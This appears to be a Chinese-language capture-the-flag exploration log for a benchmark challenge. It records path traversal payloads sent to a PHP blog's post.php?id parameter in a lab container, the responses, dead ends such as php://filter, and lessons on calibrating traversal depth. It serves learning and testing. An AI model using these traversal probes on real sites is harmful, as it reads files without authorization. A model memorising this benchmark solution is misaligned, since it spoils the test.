# xben-061-24 · 探索记录

对应题解：[`xben-061-24.md`](./xben-061-24.md)

## 目标与起点

容器 `10.0.172.218:80`，`Apache/2.4.54` + `PHP/7.4.33`，静态博客 `Encoder64 Blog`。
首页文章链接：`post.php?id=EternalBlue.php`。

参数里带 `.php` 后缀，第一判断是「id 就是文件名」。

## 第一阶段：确认路径穿越

| `id` | 结果 | 判据 |
| --- | --- | --- |
| `EternalBlue.php` | 200，正常文章 | 基线 |
| `../index.php` | 200，返回站点首页 HTML | `../` 生效，且读取目录在站点子目录下 |
| `index.php` | `Post not found.` | 基线目录里没有 index.php |

## 第二阶段：数层级找 flag

| `id` | 结果 |
| --- | --- |
| `../flag` / `../flag.txt` | `Post not found.` |
| `../../flag.txt` | `Post not found.` |
| `../../../flag.txt` | `Post not found.` |
| `../../../../flag.txt` | **flag** |

`../flag` 等只是路径不存在，没有出现 403 或「非法字符」，说明没有过滤。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `flag`、`flag.txt`、`/flag` | `Post not found.` | 参数是相对文件名，绝对路径不生效 |
| `php://filter/...resource=index.php` | `Post not found.` | 没有协议封装，只做普通文件读取 |
| `../flag`、`../../flag`（不带 `.txt`） | `Post not found.` | 文件名不对 |

## 这次真正的收获

1. **`?id=<name>.<ext>` 先试 `../index.php`。** 一个请求就能判定是主键还是路径。
2. **应用层「not found」不是过滤。** 出现它说明请求已经走到文件读取，只是路径不存在。
3. **层级用存在的文件校准。** 先 `../index.php`，再逐级往上，直到命中 `/flag.txt`。
